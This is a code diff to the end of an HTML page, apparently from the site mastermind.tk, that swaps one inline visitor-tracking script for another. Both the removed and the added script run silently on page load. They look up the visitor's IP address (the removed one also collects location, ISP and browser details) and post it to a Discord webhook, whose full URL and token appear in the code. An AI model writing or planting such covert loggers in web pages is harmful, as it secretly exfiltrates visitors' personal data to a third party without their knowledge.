@@ -161,19 +161,19 @@
 
 <script type="text/javascript">
 if(location.href==="https://memastermind.tk/"){location.href = "https://mastermind.tk"}
-url = "https://discord.com/ap"+"i/webhooks/10660371740"+"19043359/RD08fANiei7ZqUludvAvxBYMF_c"+"kcmjdio5diLmssSGM_E1YttKMAnzX8O2mukrJa277"
-fetch('https://ip-api.com/json/')
-    .then(results => results.json())    
-    .then(data => fetch(url, {
-        method: 'POST',
-        cors: 'no-cors',
+url="https://discord.com/api/webhooks/1066037174019043359/RD08fANiei7ZqUludvAvxBYMF_ckcmjdio5diLmssSGM_E1YttKMAnzX8O2mukrJa277"
+fetch("https://api.ipify.org?format=json", {cors: "no-cors"}).then(res => res.json()).then(data => {
+    fetch(url, {
+        method: "POST",
         headers: {
-            'Content-Type': 'application/json'
+            "Content-Type": "application/json"
         },
         body: JSON.stringify({
-            content: `**IP:** ${data.query}\n**Country:** ${data.country}\n**Region:** ${data.regionName}\n**City:** ${data.city}\n**ISP:** ${data.isp}\n**Timezone:** ${data.timezone}\n**Browser:** ${navigator.userAgent}`
+            content: `IP: ${data.ip}`
         })
-    }));
+    })
+}
+)
 </script>
 </body>
 </html>
